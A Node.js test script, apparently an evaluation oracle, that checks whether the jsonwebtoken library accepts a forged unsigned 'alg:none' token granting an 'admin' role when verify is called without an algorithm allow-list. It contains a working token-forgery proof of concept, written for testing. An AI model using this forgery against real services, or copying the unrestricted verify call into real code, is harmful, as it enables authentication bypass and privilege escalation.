'use strict';
const crypto = require('node:crypto');
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

function main() {
  let jwt;
  try {
    jwt = require('jsonwebtoken');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  const marker = 'JWT_ORACLE_' + process.pid + '_' + Date.now();
  const secret = 'super-secret-hmac-key-' + marker;

  // ---- Benign operation: sign and verify with HS256, explicit algorithms ----
  let benignPayloadOk = false;
  let validToken;
  try {
    validToken = jwt.sign({ marker: marker, role: 'user' }, secret, { algorithm: 'HS256', expiresIn: '1h' });
    const decodedBenign = jwt.verify(validToken, secret, { algorithms: ['HS256'] });
    if (decodedBenign && decodedBenign.marker === marker && decodedBenign.role === 'user') {
      benignPayloadOk = true;
    }
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign sign/verify operation failed: ' + String(e && e.message) });
    return;
  }

  if (!benignPayloadOk) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign verify did not return expected payload' });
    return;
  }

  // Operation completed successfully up to this point.
  const operation_completed = true;

  // ---- Malicious operation: forge an alg:none token and verify WITHOUT restricting algorithms ----
  // Build an unsigned JWT with alg: none, claiming elevated privileges, and signature stripped.
  function base64url(input) {
    return Buffer.from(JSON.stringify(input)).toString('base64')
      .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  }

  const header = { alg: 'none', typ: 'JWT' };
  const now = Math.floor(Date.now() / 1000);
  const payload = { marker: marker, role: 'admin', iat: now, exp: now + 3600 };
  const forgedToken = base64url(header) + '.' + base64url(payload) + '.';

  let exploit_succeeded = false;
  let evidence = '';

  try {
    // Caller does NOT restrict algorithms - mirrors common insecure real-world usage.
    const decodedMalicious = jwt.verify(forgedToken, secret);
    if (decodedMalicious && decodedMalicious.marker === marker && decodedMalicious.role === 'admin') {
      exploit_succeeded = true;
      evidence = 'jwt.verify() accepted a forged alg:none unsigned token and returned payload: ' + JSON.stringify(decodedMalicious);
    } else {
      evidence = 'jwt.verify() returned unexpected payload for forged token: ' + JSON.stringify(decodedMalicious);
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'jwt.verify() rejected forged alg:none token as expected: ' + String(e && e.message);
  }

  finish({ operation_completed: operation_completed, exploit_succeeded: exploit_succeeded, evidence: evidence });
}

try {
  main();
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'uncaught exception: ' + String(e && e.message) });
}
